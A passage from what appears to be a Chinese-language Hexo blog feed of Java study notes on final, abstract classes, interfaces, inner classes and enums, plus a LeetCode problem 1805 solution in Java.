<td align="center">本类</td>
<td align="center">必须一样</td>
<td align="center">类型、个数或者顺序至少有一个不同</td>
<td align="center">无要求</td>
<td align="center">无要求</td>
</tr>
<tr>
<td align="center">重写（override）</td>
<td align="center">父子类</td>
<td align="center">必须一样</td>
<td align="center">必须相同</td>
<td align="center">子类重写的方法，返回的类型和父类返回的类型一致，或者是其子类</td>
<td align="center">子类不能缩小父类方法的访问范围</td>
</tr>
</tbody></table>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(十)——类变量和类方法</title>
    <url>/2022/09/14/27-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81)%E2%80%94%E2%80%94final%E5%8F%8A%E6%8A%BD%E8%B1%A1%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>final可以修饰类、属性、方法和局部变量</p>
<p>在某些情况下，可能有以下去修，就会使用到final：</p>
<ul>
<li>1、当不希望类被继承时，可以用final修饰</li>
<li>2、当不希望父类的某个方法被子类覆盖&#x2F;重写时，可以用final关键字修饰【访问修饰符 final 返回类型 方法名】</li>
<li>3、当不希望类的某个属性的值被修改，可以用final修饰。【public final double TAX_RATE &#x3D; 0.1】</li>
<li>4、当不希望某个局部变量被修改，可以用final修饰</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.static_.final_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">final01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">E</span>();</span><br><span class="line">        <span class="comment">//e.AGE = 12;//加了final后就不可以修改</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class B extends  A&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> <span class="keyword">extends</span> <span class="title class_">C</span>&#123;</span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void hi() &#123;</span></span><br><span class="line"><span class="comment">//        super.hi();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">E</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">AGE</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">double</span> <span class="variable">NUM</span> <span class="operator">=</span> <span class="number">0.0</span>;</span><br><span class="line">        <span class="comment">//NUM = 0.9;//final修饰的局部变量也不能修改</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="final使用细节"><a href="#final使用细节" class="headerlink" title="final使用细节"></a>final使用细节</h2><ul>
<li>1、final修饰的属性又叫敞亮，一般用XX_XX_XX命名</li>
<li>2、final修饰的属性在定义时，必须赋初值，并且以后不能再修改，赋值可以在如下位置之一：<ul>
<li>（1）定义时</li>
<li>（2）在构造器中</li>
<li>（3）在代码块中</li>
</ul>
</li>
<li>3、如果final修饰的属性是静态的，则初始化的位置只能是：<ul>
<li>（1）定义时</li>
<li>（2）在静态代码块 不能再构造器中赋值</li>
</ul>
</li>
<li>4、final类不能继承，但是可以实例化对象</li>
<li>5、如果类不是final类，但是含有final方法，则该方法虽然不能重写，但是可以被继承。</li>
<li>6、一般来说，如果一个类是final类了，就没有必要再修饰为final方法了。</li>
<li>7、final不能修饰构造方法（构造器）</li>
<li>8、final和static往往搭配使用，效率更高。因为不会导致类的加载，底层编译器做了优化。</li>
<li>9、包装类（Integer,Double，Float，Boolean都是final），String也是final类，这些类是不能被继承的。</li>
</ul>
<h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><h2 id="引出"><a href="#引出" class="headerlink" title="引出"></a>引出</h2><p>当父类的某些方法，需要声明，但又不确定如何实现时，可以将其声明为抽象方法，那么这个类就是抽象类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Abstact01</span> &#123;</span><br><span class="line">    String name ;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//当一个类中存在抽象方法时，需要将该类声明为abstact类</span></span><br><span class="line"><span class="comment">//一般来说，抽象类会被继承，由其子类来实现抽象方法</span></span><br></pre></td></tr></table></figure>

<h2 id="抽象类介绍"><a href="#抽象类介绍" class="headerlink" title="抽象类介绍"></a>抽象类介绍</h2><ul>
<li>1、抽象类的价值更多作用是在于设计，是设计者设计好后，让子类继承并实现抽象类()</li>
<li>2、抽象类，是面试比较喜欢问的知识点，在框架和设计模式使用较多。</li>
</ul>
<h2 id="抽象类细节"><a href="#抽象类细节" class="headerlink" title="抽象类细节"></a>抽象类细节</h2><ul>
<li>1、抽象类不能被实例化</li>
<li>2、抽象类不一定要包含abstact方法</li>
<li>3、一旦类包含了abstact方法，则这个类必须被声明为abstact</li>
<li>4、abstract只能修饰类和方法，不能修饰属性和其他的。</li>
<li>5、抽象类可以有任意成员【因为抽象类还是类】，比如：非抽象方法，构造器、静态属性等</li>
<li>6、抽象方法不能有主体，即不能实现：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract void hi()&#123;&#125;//错误，不能有主体&#123;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>7、如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，除非它自己也声明为abstact类</li>
<li>8、抽象方法不能使用private、final和static等修饰，因为这些关键字都是和重写相违背的</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(十一)——接口、四种内部类</title>
    <url>/2022/09/15/28-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%80)%E2%80%94%E2%80%94%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>接口就是给出一些没有实现的方法，封装到一起，到某个类要使用的时候，在根据具体情况把这些方法写出来。语法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">interface 接口名&#123;</span><br><span class="line"><span class="comment">//属性</span></span><br><span class="line"><span class="comment">//抽象方法、默认实现方法或静态方法。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class 类名 implements 接口&#123;</span><br><span class="line">自己属性，</span><br><span class="line">自己方法：</span><br><span class="line">必须实现的接口的抽象方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<ul>
<li>接口是更加抽象的抽象的类，抽象类里的方法可以有方法体，接口里的所有方法都没有方法体 【idk7.0之前】。接口体现了程序设计的多态和高内聚低偶合的设计思想.</li>
<li>特别说明：Jdk8.0后接口类可以有<span style='color:red'>静态方法，默认方法</span>，也就是说接口中可以有方法的具体实现。</li>
<li>在接口中，抽象方法可以省略abstact关键字。</li>
</ul>
<span id="more"></span>

<h2 id="接口的应用"><a href="#接口的应用" class="headerlink" title="接口的应用"></a>接口的应用</h2><p>对初学者讲，理解接口的概念不算太难，难的是不知道<span style='color:red'>什么时候使用接口</span>,考虑以下两个应用场景：</p>
<ul>
<li>现在要制造战斗机,武装直升机.专家只需把飞机需要的功能&#x2F;规格定下来即可,然后让别的人具体实现就可。</li>
<li>现在有一个项目经理（段玉),管理三个程序员,功能开发一个软件,为了控制和管理软件,项目经理可以定义<br>一些接口，然后由程序员具体实现。（1.项目质量 2.项目进度 3.项目奖）参加工作</li>
</ul>
<h2 id="接口使用细节"><a href="#接口使用细节" class="headerlink" title="接口使用细节"></a>接口使用细节</h2><ul>
<li><p>1、接口不能被实例化</p>
</li>
<li><p>2、接口中所有的方法是 public方法，接口中抽象方法，可以不用abstract 修饰</p>
</li>
<li><p>3、一个普通类实现接口，就必须将该接口的所有方法都实现</p>
</li>
<li><p>4、抽象类实现接口，可以不用实现接口的方法。</p>
</li>
<li><p>5、一个类同时可以实现多个接口 [举例]</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IA</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//等价 public static final int n1 = 10;</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IB</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span> <span class="keyword">implements</span> <span class="title class_">IA</span>,IB&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>6、接口中的属性,只能是final的，而且是 public static final 修饰符。比如：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">1</span>;<span class="comment">//实际上是 public static final int a=1;（必须初始化）</span></span><br></pre></td></tr></table></figure>

<ul>
<li>7、接口中属性的访问形式：接口名.属性名</li>
<li>8、接口不能继承其它的类,但是可以继承多个别的接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">B</span>,C&#123;&#125;</span><br><span class="line"><span class="comment">//接口和接口之间，我们谈继承</span></span><br><span class="line"><span class="comment">//接口和类之间，我们谈实现</span></span><br></pre></td></tr></table></figure>

<ul>
<li>9、接口的修饰符之能是public和默认，这点和类的修饰符是一样的。</li>
</ul>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.static_.Interface_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">interface1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        System.out.println(b.a);</span><br><span class="line">        System.out.println(A.a);</span><br><span class="line">        System.out.println(B.a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">implements</span> <span class="title class_">A</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="接口-VS-继承"><a href="#接口-VS-继承" class="headerlink" title="接口 VS 继承"></a>接口 VS 继承</h2><p>当子类继承了父类，就自动的拥有父类的功能。如果子类需要扩展功能，可以通过实现接口的方式扩展。可以理解：<span style='color:red'>实现接口是对 java 单继承机制的一种补充.</span></p>
<ul>
<li>1、接口和继承解決的问题不同<ul>
<li>继承的价值主要在于：解决代码的复用性和可维护性。</li>
<li>接口的价值主要在于：设计，设计好各种规范(方法)，让其它类去实现这些方法。即更加的灵活。</li>
</ul>
</li>
<li>2、接口比继承重加灵活：<ul>
<li>接口比继承更加灵活，继承是满足 is-a的关系，而接口只需满足 like -a的关系。</li>
</ul>
</li>
<li>3、接口在一定程度上实现代码解耦，即：接口规范性＋动态绑定机制</li>
</ul>
<h2 id="接口的多态特性"><a href="#接口的多态特性" class="headerlink" title="接口的多态特性"></a>接口的多态特性</h2><ul>
<li>1、多态参数：接口引用可以指向实现了接口的类的对象</li>
<li>2、多态数组：和类的多态数组一样</li>
<li>3、接口存在多态传递现象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">interface2</span> &#123;</span><br><span class="line">    <span class="type">IG</span> <span class="variable">ig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="type">IH</span> <span class="variable">ih</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IH</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IG</span> <span class="keyword">extends</span> <span class="title class_">IH</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">IG</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>前面所学到此为止，共学习了类的五大成员：</p>
<ul>
<li>1、属性</li>
<li>2、方法</li>
<li>3、构造器</li>
<li>4、代码块</li>
<li>5、最后一部分：<span style='color:red'>内部类</span>，就在此后展开。</li>
</ul>
<h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><h2 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>一个类的内部又完整的嵌套了另一个类结构。被嵌套的类称为内部类(inner class),嵌套其他类的类称为外部类(outer class)。是我们类的第五大成员【思考：类的五大成员是哪些？[属性、方法、构造器、代码块、内部类]】，内部类最大的特点就是<span style='color:red'>可以直接访问私有属性</span>，并且可以体现类与类之间的包含关系，注意：内部类是学习的难点，同时也是重点，后面看底层源码时，有大量的内部类。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span>&#123;<span class="comment">//外部哪</span></span><br><span class="line">			<span class="keyword">class</span> <span class="title class_">Inner</span>&#123;<span class="comment">//内部类</span></span><br><span class="line">			&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Other</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内部类的分类"><a href="#内部类的分类" class="headerlink" title="内部类的分类"></a>内部类的分类</h2><ul>
<li>定义在外部类局部位置上（比如方法内）：<ul>
<li>1、局部内部类（有类名）</li>
<li>2、<span style='color:red'>匿名内部类（没有类名，重点）</span></li>
</ul>
</li>
<li>定义在外部类的成员位置上：<ul>
<li>1、成员内部类（没用static修饰）</li>
<li>2、静态内部类（使用static修饰）</li>
</ul>
</li>
</ul>
<h2 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h2><p>说明：局部内部类是定义在外部类的局部位置，比如方法中，并且有类名</p>
<ul>
<li>1、可以直接访问外部类的所有成员，包含私有的</li>
<li>2、不能添加访问修饰符，因为它的地位就是一个局部变量。局部变量是不能使用修饰符的。但是可以使用final修饰，因为局部变量也可以使用final。</li>
<li>3、作用域:仅仅在定义它的方法或代码块中。</li>
<li>4、局部内部类—访问—-&gt;外部类的成员（访问方式:直接访问）</li>
<li>5、外部类—访问—-&gt;局部内部类的成员（访问方式:创建对象，再访问(注意:必须在作用域内）</li>
<li>6、外部其他类—不能访问—-&gt;局部内部类（因为局部内部类地位是一个局部变量）</li>
<li>7、如果外部类和局部内部类的成员重名时，默认遵循就近原则，如果想访问外部类的成员，则可以使用（外部类名.this.成员）去访问。</li>
</ul>
<p>为什么要加一个this？outer.this本质上就是外部类的对象，即哪个对象调用了m1，那么outer.this就是哪个对象。</p>
<p>记住：</p>
<ul>
<li>1、局部内部类定义在方法中&#x2F;代码块</li>
<li>2、作用域在方法体或者代码块中</li>
<li>3、<span style='color:red'>本质仍然是一个类</span></li>
</ul>
<h2 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a><span style='color:red'>匿名内部类</span></h2><p>说明：匿名内部类是定义在外部类的局部位置，比如方法中，并且没有类名。</p>
<ul>
<li>（1）本质是类 </li>
<li>（2）内部类 </li>
<li>（3）该类没有名字 （表面上看没有，但系统底层会给他分配一个隐藏名字）</li>
<li>（4）同时还是一个对象</li>
</ul>
<h3 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 类或接口(参数列表)&#123;</span><br><span class="line">		类体</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.static_.Inner_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnonymousInnerClass</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer04</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//基于接口的匿名内部类</span></span><br><span class="line">        <span class="comment">//1.需求: 想使用 IA 接口,并创建对象 </span></span><br><span class="line">        <span class="comment">//2.传统方式，是写一个类，实现该接口，并创建对象 </span></span><br><span class="line">      	<span class="comment">//3.需求是 Tiger/Dog 类只是使用一次，后面再不使用 </span></span><br><span class="line">      	<span class="comment">//4. 可以使用匿名内部类来简化开发</span></span><br><span class="line">        <span class="comment">//5. tiger 的编译类型 ? IA</span></span><br><span class="line">        <span class="comment">//6. tiger 的运行类型 ? 就是匿名内部类 Outer04$1(外部类名+$1)</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            我们看底层 会分配 类名 Outer04$1</span></span><br><span class="line"><span class="comment">            class Outer04$1 implements IA &#123;</span></span><br><span class="line"><span class="comment">                @Override</span></span><br><span class="line"><span class="comment">                public void cry() &#123;</span></span><br><span class="line"><span class="comment">                    System.out.println(&quot;老虎叫唤...&quot;);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">IA</span> <span class="variable">tiger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IA</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.printf(<span class="string">&quot;tiger的运行类型：&quot;</span>+tiger.getClass());</span><br><span class="line">        tiger.cry();</span><br><span class="line">        tiger.cry();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="匿名内部类注意事项"><a href="#匿名内部类注意事项" class="headerlink" title="匿名内部类注意事项"></a>匿名内部类注意事项</h3><ul>
<li>1、匿名内部类的语法比较奇特，需要注意，因为匿名内部类既是一个类的定义,同时它本身也是一个对象，因此从语法上看，它既有定义类的特征，也有创建对象的特征，对前面代码分析可以看出这个特点，因此可以调用匿名内部类方法。</li>
<li>2、可以直接访问外部类的所有成员，包含私有的[案例演示]</li>
<li>3、不能添加访问修饰符,因为它的地位就是一个局部变量。 [过]</li>
<li>4、作用域:仅仅在定义它的方法或代码块中。 [过]</li>
<li>5、匿名内部类—访问—-&gt;外部类成员[访问方式:直接访问]</li>
<li>6、外部其他类—不能访问—-&gt;匿名内部类(因为匿名内部类地位是一个局部变量)</li>
<li>7、如果外部类和匿名内部类的成员重名时，匿名内部类访问的话，默认遵循就近原则，如果想访问外部类的成员，则可以使用 (外部类名.this.成员)去访问</li>
</ul>
<h2 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h2><p>说明：成员内部类是定义在外部类的成员位置，并且没有static修饰。</p>
<ul>
<li>1、可以直接访问外部类的所有成员，包括私有的</li>
<li>2、可以添加任意的访问修饰符（public、protected、默认、private），因为他的地位本身就是一个成员</li>
<li>3、作用域和外部类的其他成员- -样，为整个类体比如前面案例，在外部类的成员方法中创建成员内部类对象，再调用方法.</li>
<li>4、成员内部类—访—- &gt;外部类成员(比如:属性) [访问方式:直接访问] (说明)</li>
<li>5、外部类–访——&gt;成员内部类(说明)访向方式:创建对象， 再访问</li>
<li>6、外部其他类–访向—成员内部类</li>
<li>7、如果外部类和内部类的成员重名时，内部类访问的话，默认遵循就近原则，如果想访问外部类的成员，则可以使用(外部类名.this.成员) 去访问</li>
</ul>
<h2 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h2><p>说明：静态内部类是定义在外部类的成员位置，并且有static修饰</p>
<ul>
<li>1、可以直接访问外部类的所有静态成员，包含私有的，但不能直接访问非静态成员</li>
<li>2、可以添加任意访问修饰符(public、protected 、默认、private),因为它的地位就是一个成员。</li>
<li>3、作用域:同其他的成员，为整个类体</li>
<li>4、静态内部类—访问—-&gt;外部类(比如:静态属性) [访问方式:直接访问所有静态成员]</li>
<li>5、外部类–访问—— &gt;静态内部类访问方式:创建对象，再访问</li>
<li>6、外部其他类—访问—-&gt;静态内部类</li>
<li>7、如果外部类和静态内部类的成员重名时，静态内部类访问的时，默认遵循就近原则，如果想访问外部类的成员，则可以使用(外部类名.成员) 去访问</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(十二)——枚举和注解</title>
    <url>/2022/09/16/29-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%8C)%E2%80%94%E2%80%94%E6%9E%9A%E4%B8%BE/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><h2 id="枚举类型的特点"><a href="#枚举类型的特点" class="headerlink" title="枚举类型的特点"></a>枚举类型的特点</h2><ul>
<li>值是有限的值</li>
<li>只读，必须要修改</li>
</ul>
<p>因此，我们可以理解：</p>
<ul>
<li>枚举是一组常量的集合。</li>
<li>枚举属于一种特殊的类，里面只包含一组有限的特定的对象。</li>
</ul>
<span id="more"></span>

<h2 id="枚举的实现方式"><a href="#枚举的实现方式" class="headerlink" title="枚举的实现方式"></a>枚举的实现方式</h2><ul>
<li>自定义类实现枚举</li>
<li>使用enum关键字实现枚举</li>
</ul>
<h2 id="自定义枚类实现枚举"><a href="#自定义枚类实现枚举" class="headerlink" title="自定义枚类实现枚举"></a>自定义枚类实现枚举</h2><ul>
<li>1、不需要提供setXxx方法，因为枚举对象值通常为只读.</li>
<li>2、对枚举对象&#x2F;属性使用final + static共同修饰，实现底层优化.</li>
<li>3、枚举对象名通常使用全部大写，常量的命名规范</li>
<li>4、枚举对象根据需要，也可以有多个属性</li>
</ul>
<p>特点：</p>
<ul>
<li>1、构造器私有化</li>
<li>2、本类内部创建一组对象[例如：四个春夏秋冬]</li>
<li>3、 对外暴露对象(通过为对象添加publicfinalstatic修饰符) </li>
<li>4、 可以提供 get 方法，但是不要提供 set</li>
</ul>
<h2 id="enum关键字实现枚举"><a href="#enum关键字实现枚举" class="headerlink" title="enum关键字实现枚举"></a>enum关键字实现枚举</h2>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>每日一题——December</title>
    <url>/2022/12/06/31-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98December/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>12月份每日一题记录~</p>
<h1 id="1805-字符串中不同整数的数目"><a href="#1805-字符串中不同整数的数目" class="headerlink" title="1805. 字符串中不同整数的数目"></a><a href="https://leetcode.cn/problems/number-of-different-integers-in-a-string/">1805. 字符串中不同整数的数目</a></h1><blockquote>
<p>给你一个字符串 word ，该字符串由数字和小写英文字母组成。</p>
<p>请你用空格替换每个不是数字的字符。例如，”a123bc34d8ef34” 将会变成 “ 123  34 8  34” 。注意，剩下的这些整数为（相邻彼此至少有一个空格隔开）：”123”、”34”、”8” 和 “34” 。</p>
<p>返回对 word 完成替换后形成的 不同 整数的数目。</p>
<p>只有当两个整数的 不含前导零 的十进制表示不同， 才认为这两个整数也不同。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：word = &quot;a123bc34d8ef34&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：不同的整数有 &quot;123&quot;、&quot;34&quot; 和 &quot;8&quot; 。注意，&quot;34&quot; 只计数一次。</span><br></pre></td></tr></table></figure>


</blockquote>
<span id="more"></span>

<h2 id="思路：双指针"><a href="#思路：双指针" class="headerlink" title="思路：双指针"></a>思路：双指针</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numDifferentIntegers</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        Set&lt;String&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> word.length(),left = <span class="number">0</span>,right;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(left &lt; n &amp;&amp; !Character.isDigit(word.charAt(left)))&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(left == n) <span class="keyword">break</span>;</span><br><span class="line">            right = left;</span><br><span class="line">            <span class="keyword">while</span>(right &lt; n &amp;&amp; Character.isDigit(word.charAt(right)))&#123;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(right - left &gt; <span class="number">1</span> &amp;&amp; word.charAt(left) == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            set.add(word.substring(left,right));</span><br><span class="line">            left = right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> set.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(七)——Object类详解</title>
